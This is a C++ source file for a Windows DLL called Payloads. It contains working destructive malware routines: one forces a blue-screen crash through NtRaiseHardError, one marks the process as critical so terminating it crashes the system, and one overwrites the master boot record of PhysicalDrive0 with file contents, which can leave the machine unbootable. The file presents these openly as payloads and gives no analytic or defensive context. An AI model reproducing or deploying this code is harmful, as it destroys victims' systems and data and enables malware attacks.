// Payloads.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "Payloads.h"

namespace Payloads {

	void GetDesktopResolution(int& w, int& h) { RECT desktop; const HWND hDesktop = GetDesktopWindow(); GetWindowRect(hDesktop, &desktop); w = desktop.right; h = desktop.bottom; }

	void Payloads::BSOD()
	{
		BOOLEAN prev; unsigned long response; DWORD error = 0xDEADDEAD;

		RtlAdjustPrivilege(19, 1, 0, &prev);
		NtRaiseHardError(error, 0, 0, 0, 6, &response);
	}

	void Payloads::EnableCriticalMode()
	{
		BOOLEAN prev; ULONG a;
		RtlAdjustPrivilege(20, 1, 0, &prev);
		NtSetInformationProcess((HANDLE)-1, 0x1d, &a, sizeof(ULONG));
	}

	bool Payloads::MasterBootRecordOverwrite()
	{
		DWORD dw;
		LPCWSTR p = L"C:\\Windows\\System32\\data.bin";
		HANDLE d = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		HANDLE b = CreateFile(p, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
		DWORD s = GetFileSize(b, 0);
		BYTE *m = new BYTE[s];
		ReadFile(b, m, s, &dw, 0);
		if (WriteFile(d, m, s, &dw, 0)) 
		{ return TRUE; }
		else { return FALSE; }
		CloseHandle(d);
	}
}